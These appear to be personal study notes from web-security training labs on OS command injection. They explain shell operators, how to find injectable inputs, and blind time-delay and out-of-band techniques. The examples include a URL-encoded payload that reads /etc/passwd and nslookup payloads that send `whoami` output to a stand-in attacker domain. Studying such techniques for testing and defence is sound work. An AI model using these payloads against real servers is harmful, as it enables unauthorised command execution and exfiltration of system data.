- OS command injection is a technique used via a web interface in order to execute OS commands on a web server
	- The user supplies operating system commands through a web interface in order to execute OS commands.
- can typically fully compromise the application and its data
- in band and blind/out-of-band injections
- appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. `%3B` is URL encoded and decodes to semicolon
	`http://sensitive/something.php?dir=%3Bcat%20/etc/passwd`
# Explanation of Logical Operators 
- `&` - when added to the end of a command that take a long time to continue (`wget` a large file or `ping`) append `&` to the end of the command to run the command in the background or asynchronously
- `|` - this pipes the output of the first command as input into the second command
	- Uses of `|` will make command 2 to be executed whether command 1 execution is successful or not.
	- eg. `ls -l | grep ".txt"`
	- can also use `;` (Unix systems)
- `&&` - this runs the first command first and then then the second command synchronously
	- command 1 must succeed for command 2 to be performed (AND logical operator, both must be true)
- `||` - this runs either command 1 or command 2 (OR logical operator, either one must be true)
	- command 2 will only run if command 1 fails
- `$()` - captures output as a string
	- can output command as a variable for later use
	- `echo $(whoami)` or `$(touch test.sh; echo 'ls' > test.sh)`
- `\n` - starts a newline
	- only for Unix-based systems
# Tips & Tricks 
- if given multiple inputs, will have to try and see which one accepts system commands
- Useful Operators:
	- `| & || && ; \n $()`
- use ctrl+U to encode the payload. 
- append `&` for commands like `wget` or `ping` and && for normal commands at the end (there might be hidden OS command that runs after the client input, so use && or ||)
- leave the input blank and use `||` to ensure that the payload is the command that runs if the client input is a required field
- try each input to check if vulnerable because not all input will be vulnerable
- usually if there is a client input for email, it runs a OS command
	- try injecting payload there
- sometimes. the input controlled is within quotations
	- terminate the quoted string using ' or " before using operators
# In Band Command Injections
- analyze the response and determine if the application is vulnerable
# Blind/Injections
- trigger time delay or output the response of the command in the web root and retrieve file directly using a browser
## Blind OS Command Injections With Time Delays 
- use `ping -c 10 <ip>` to sleep the application for 10s
- if sleeps, input is vulnerable
Lab : [[Blind OS command injection with time delays]]
## Blind OS Command Injections By Redirecting Output
- redirect the response of the command and retrieve the file directly using the browser 
	- websites may be configured to serve files from a parent directory directory 
		- eg. if output the contents of the command echo "whoami" > /var/www/static/whoami.txt
		- using `example.com/whoami.txt` directly i can access the contents of `whoami.txt` 
## Blind Injections With Out-Of-Band Interactions
- trigger a out-of-band network interaction with a system you control
- example payload:
	`& nslookup kgji2ohoyw.web-attacker.com &`
	- this causes a DNS lookup
- add a system command to output it into the system controlled
	`& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`
	- this will append the output of `whoami` to the url
		`wwwuser.kgji2ohoyw.web-attacker.com`